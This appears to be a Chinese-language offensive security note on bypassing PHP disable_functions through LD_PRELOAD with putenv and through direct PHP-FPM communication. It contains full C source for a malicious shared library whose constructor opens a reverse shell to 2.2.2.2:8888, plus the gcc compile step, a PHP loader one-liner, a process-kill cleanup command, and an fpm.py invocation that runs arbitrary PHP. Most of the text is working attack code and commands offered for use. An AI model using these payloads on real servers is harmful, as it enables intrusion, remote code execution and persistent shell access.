putenv，其原理是linux系统中的动态链接库LD_PRELOAD，可以设定部分函数执行时就加载我们自定义的恶意库。这些函数有

mail("","","","","");error_log("test",1,"","");mb_send_mail('','','');imap_mail("1@a.com","0","1","2","3");new Imagick("/tmp/payload.eps");

用法如下，先本地编译恶意动态库
gcc -shared -fPIC LD.c -o LD.so –w

#include <unistd.h>
void payload(void){    system("bash -i >& /dev/tcp/2.2.2.2/8888 0>&1 ");}
__attribute__ ((__constructor__)) void exec(void){    if (getenv("LD_PRELOAD") == NULL){        return;    }
    unsetenv("LD_PRELOAD");    payload();
    return;}

然后加载动态库

<?phpputenv("LD_PRELOAD=./LD_x64.so");mail("","","","","");?>

不过这样会导致启动3w多个sh，最好用完之后用下面这条命令删掉sh进程
ps -ef | grep -v grep | grep sh | awk '{print $2}' | xargs kill -9
更加优美的方式见
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD

CVE-2014-6271也和putenv相关，其本质是bash破壳漏洞，但因为putenv可以调用bash，结合bash破壳，导致后面的命令被执行了。

PHP-FPM
需要nginx + PHP-FPM，基本原理就是模仿nginx的fast-cgi，直接与php-fpm进行通信。
其中本地版如下
https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
python fpm.py 127.0.0.1 -p 9000 /var/www/html/phpinfo.php -c '<?php echo `id`;exit;?>'


这个脚本无法利用在webshell上，webshell版只有蚁剑的bypass disable functions插件才能用，其原理是和php-fpm通信，另起一个php web服务，然后在旧php和新php上做代理，新起的php上没有disable_function，从而绕过。
https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5
